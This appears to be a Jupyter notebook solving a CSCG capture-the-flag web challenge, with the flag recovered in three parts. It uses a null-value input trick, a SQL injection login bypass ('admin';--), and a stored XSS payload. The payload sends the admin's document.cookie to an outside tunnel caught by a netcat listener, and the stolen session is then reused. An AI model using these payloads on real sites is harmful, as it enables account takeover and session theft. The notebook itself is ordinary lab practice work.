In [71]:
import requests
import re
from subprocess import Popen, PIPE, check_output
import os

In [72]:
BASE_URL = 'https://944ac9cfe17e9652f7b0f498-1024-intro-web-3.challenge.cscg.live:1337'
LISTEN_PORT = 8090
listen_server = None
expose_server = None
expose_url = ''

In [73]:
flag_part_1 = requests.post(f'{BASE_URL}/nodejs/random-hashing', json={'chosenNumber': None}).text.replace("Here's the first part of your flag, sha256'd 0 times: ", '')
flag_part_1

'CSCG{Q8oIoy3P'

In [74]:
flag_part_2_encapsuled = requests.post(f'{BASE_URL}/login.php', data={'username': "admin';--", 'password': ""}).text
flag_part_2 = re.findall(r"Here\'s your flag part 2/3: (.+)</body>", flag_part_2_encapsuled)[0]
flag_part_2

's956Uwvv'

In [ ]:
# This block is just to get around my NAT at home
cmd_expost_listen_server = f"ssh -R 80:localhost:{LISTEN_PORT} nokey@localhost.run"

if expose_server is None or expose_server.poll() is not None:
    expose_server = Popen([cmd_expost_listen_server], stdout=PIPE, stdin=None, stderr=None, shell=True)
    expose_url = ''

    for stdout_line in iter(expose_server.stdout.readline, ""):
        stdout_line = stdout_line.decode()
        if 'https://' not in stdout_line:
            continue

        expose_url = re.findall(r'https://.+\.lhr\.life', stdout_line)[0]
        break

Pseudo-terminal will not be allocated because stdin is not a terminal.

Welcome to localhost.run!

Follow your favourite reverse tunnel at [https://twitter.com/localhost_run].

To set up and manage custom domains go to https://admin.localhost.run/

More details on custom domains (and how to enable subdomains of your custom
domain) at https://localhost.run/docs/custom-domains

If you get a permission denied error check the faq for how to connect with a key or
create a free tunnel without a key at [http://localhost:3000/docs/faq#generating-an-ssh-key].

To explore using localhost.run visit the documentation site:
https://localhost.run/docs/


** your connection id is b5f898cd-0ae7-4b21-8dc2-2467af6abb21, please mention it if you send me a message about an issue. **



In [76]:
xss_payload = f"""<script>
fetch('{expose_url}', {{
method: 'POST',
mode: 'no-cors',
body:document.cookie
}});
</script>"""
requests.post(f'{BASE_URL}/guestbook.php', data={'username': 'hello', 'content': xss_payload})

<Response [200]>

In [77]:
cmd_start_listen_server = f"echo -e 'HTTP/1.1 200 OK\r\nContent-length: 0\r\nConnection: close\r\n\r\n' | nc -l {LISTEN_PORT}"
admin_req = check_output(cmd_start_listen_server, shell=True)
expose_server.kill()

In [78]:
admin_session = re.findall(r'session-id=\w+', admin_req.decode())[0].replace('session-id=', '')
flag_part_3_encapsuled = requests.get(f'{BASE_URL}/guestbook.php', cookies={'session-id': admin_session}).text
flag_part_3 = re.findall(r"Here\'s your flag part 3/3: (.+)", flag_part_3_encapsuled)[0]
flag_part_3

'WIfJAzNs}'

In [79]:
flag = flag_part_1 + flag_part_2 + flag_part_3
flag

'CSCG{Q8oIoy3Ps956UwvvWIfJAzNs}'

connect_to localhost port 8090: failed.
connect_to localhost port 8090: failed.
